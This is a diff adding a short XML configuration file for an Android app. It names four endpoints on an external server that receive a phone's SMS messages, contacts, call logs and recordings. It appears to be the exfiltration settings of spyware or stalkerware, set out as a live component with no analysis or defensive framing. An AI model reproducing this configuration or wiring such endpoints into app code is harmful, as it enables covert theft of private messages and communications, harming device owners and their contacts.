@@ -1,0 +1,7 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<android>
+	<sms_post>http://www.davmb.com/action/api/sms_pro.php</sms_post> 
+	<contact_post>http://www.davmb.com/action/api/tel_pro.php</contact_post>
+	<calllog_post>http://www.davmb.com/action/api/call_log_pro.php</calllog_post>	
+	<record_post>http://www.davmb.com/action/api/record_pro.php</record_post> 
+</android>
